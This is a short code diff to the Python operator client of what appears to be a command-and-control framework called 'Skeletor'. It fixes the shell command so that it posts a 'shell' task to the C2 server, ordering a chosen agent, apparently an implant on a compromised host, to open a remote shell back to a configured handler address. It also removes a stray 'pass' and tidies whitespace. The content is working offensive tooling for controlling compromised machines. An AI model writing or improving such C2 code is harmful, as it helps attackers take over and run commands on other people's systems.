@@ -130,7 +130,7 @@ def cmd_shell():
     print(f"\nConfigured shell handler address is {SKELETOR_SHELL_HANDLER_ADDR}\n")
     target = input("Agent ID to launch shell on: ").strip()
     try:
-        data = {'agent_id': target, 'action': 'command', 'input': SKELETOR_SHELL_HANDLER_ADDR}
+        data = {'agent_id': target, 'action': 'shell', 'input': SKELETOR_SHELL_HANDLER_ADDR}
         requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data,headers=CUSTOM_HEADERS)
         print(f"Shell task created for {target}, check the shell handler\n")
     except Exception as e:
@@ -183,7 +183,6 @@ def cmd_addtag():
         print(f"\n{e}\n")
 
 def cmd_removetag():
-    pass
     try:
         agentid = input("Agent ID: ").strip()
         badtags = input("Tags to remove (csv format): ").strip()
@@ -195,8 +194,7 @@ def cmd_removetag():
         return
     except Exception as e:
         print(f"\n{e}\n")
-    
-    
+     
 
 def main():
     commands = {
